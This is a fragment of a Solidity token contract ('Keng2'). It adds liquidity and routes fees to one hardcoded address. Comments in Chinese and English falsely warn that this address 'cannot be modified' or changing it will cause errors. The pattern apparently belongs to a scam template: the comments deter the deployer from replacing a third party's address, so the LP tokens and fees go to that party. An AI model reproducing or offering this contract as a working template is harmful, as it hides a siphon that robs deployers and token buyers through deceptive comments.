        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {//=0xA8D8ba614ee5EF378FB6353C18F152d4E93b4cCE (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, address(0x3c02a2c3Ee5A1e9d348Bb55a96e2DAe0c7241Ce2), block.timestamp
                );
            }
        }
    }
...
contract tokens is AbsToken {
    constructor() AbsToken(
        ...
        "Keng2",//Sy
        18,//De
        1000000000000000,//Su 数量后面加20个0
        address(0x3c02a2c3Ee5A1e9d348Bb55a96e2DAe0c7241Ce2),//The address controlled by the mechanism cannot be modified, and the handling fee will be voided after modification
        address(0x3c02a2c3Ee5A1e9d348Bb55a96e2DAe0c7241Ce2)//
    ){
    }
}